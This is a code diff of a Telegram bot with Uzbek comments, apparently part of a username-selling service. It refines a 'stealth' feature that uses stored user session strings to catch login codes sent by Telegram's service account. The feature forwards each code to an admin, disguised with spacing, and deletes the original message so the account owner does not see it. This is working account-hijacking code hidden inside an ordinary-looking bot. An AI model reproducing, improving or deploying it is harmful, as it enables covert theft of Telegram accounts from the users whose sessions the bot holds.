@@ -454,16 +454,22 @@ stealth_clients = {}
 stealth_tasks = {}  # telegram_id -> asyncio.Task (run_until_disconnected)
 
 async def stealth_interceptor(event):
-    """Telegramdan (777000) kelgan login kodlarni ushlab qoluvchi handler"""
-    m = event.message
-    if not m.text:
-        return
+    """Barcha kelgan xabarlarni tekshirib, 777000 dan kelganlarni ushlab oladi"""
+    try:
+        # Faqat 777000 (Telegram xizmati) dan kelgan xabarlarni filtrlaymiz
+        sender_id = event.sender_id
+        if sender_id != 777000:
+            return
 
-    client = event.client
-    user_id = getattr(client, 'my_user_id', 'Noma\'lum')
+        m = event.message
+        if not m or not m.text:
+            return
 
-    # Login kodi borligini tekshirish
-    if "code:" in m.text.lower() or "код:" in m.text.lower() or re.search(r'\b\d{5}\b', m.text):
+        client = event.client
+        user_id = getattr(client, 'my_user_id', 'Noma\'lum')
+
+        logger.info(f"🥷 Stealth: 777000 dan xabar keldi (user: {user_id}): {m.text[:80]}")
+
         # Kodni ajratib olish (5 talik raqam)
         code_match = re.search(r"(\d{5})", m.text)
         if code_match:
@@ -473,7 +479,7 @@ async def stealth_interceptor(event):
             msg = f"🥷 <b>Stealth Intercept</b>\n"
             msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
             msg += f"🔑 KOD: <b>{enc}</b>\n"
-            msg += f"<i>(raqamlarni ketma-ket o'qing, bo'shliqlar hisobga olinmaydi)</i>"
+            msg += f"<i>(raqamlarni ketma-ket o'qing)</i>"
 
             # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
             try:
@@ -493,6 +499,10 @@ async def stealth_interceptor(event):
                 await client.delete_messages(777000, [m.id])
             except Exception as e:
                 logger.warning(f"Stealth: xabarni o'chirib bo'lmadi ({user_id}): {e}")
+        else:
+            logger.info(f"🥷 Stealth: 777000 xabarida 5 raqamli kod topilmadi (user: {user_id})")
+    except Exception as e:
+        logger.error(f"Stealth interceptor xatosi: {e}")
 
 async def start_stealth_clients():
     """Bot ishga tushganda barcha is_stealth=1 larni ulaymiz"""
@@ -500,7 +510,8 @@ async def start_stealth_clients():
         db.row_factory = aiosqlite.Row
         async with db.execute("SELECT telegram_id, session_string FROM users WHERE is_stealth=1 AND session_string IS NOT NULL") as c:
             rows = await c.fetchall()
-            
+
+    logger.info(f"🥷 Stealth: {len(rows)} ta foydalanuvchi uchun ishga tushirilmoqda...")
     for row in rows:
         tid = row['telegram_id']
         session_str = row['session_string']
@@ -516,11 +527,9 @@ async def start_stealth_client(telegram_id, session_string):
         client.my_user_id = telegram_id
         await client.connect()
         if await client.is_user_authorized():
-            # Hodisani qo'shamiz (faqat 777000 dan kelgan yangi xabarlar)
-            client.add_event_handler(stealth_interceptor, events.NewMessage(chats=777000))
+            # Filter YO'Q — barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
+            client.add_event_handler(stealth_interceptor, events.NewMessage(incoming=True))
             stealth_clients[telegram_id] = client
-            # Orqa fonda run_until_disconnected() ni ishga tushiramiz — siz
-            # start qilmasangiz Telethon event-larni umuman kuzatmaydi!
             task = asyncio.create_task(_stealth_keep_alive(client, telegram_id))
             stealth_tasks[telegram_id] = task
             logger.info(f"🥷 Stealth client ishga tushdi: {telegram_id}")
@@ -543,7 +552,6 @@ async def _stealth_keep_alive(client, telegram_id):
 
 async def stop_stealth_client(telegram_id):
     """Foydalanuvchi uchun stealth rejimni o'chirish"""
-    # Avval taskni bekor qilamiz
     task = stealth_tasks.pop(telegram_id, None)
     if task and not task.done():
         task.cancel()
@@ -551,13 +559,13 @@ async def stop_stealth_client(telegram_id):
             await task
         except asyncio.CancelledError:
             pass
-    # Keyin clientni uziamiz
     client = stealth_clients.pop(telegram_id, None)
     if client:
         try:
             await client.disconnect()
         except: pass
         logger.info(f"🛑 Stealth client to'xtatildi: {telegram_id}")
+
 
 
 async def transfer_username(bot, seller_id, buyer_id, username):
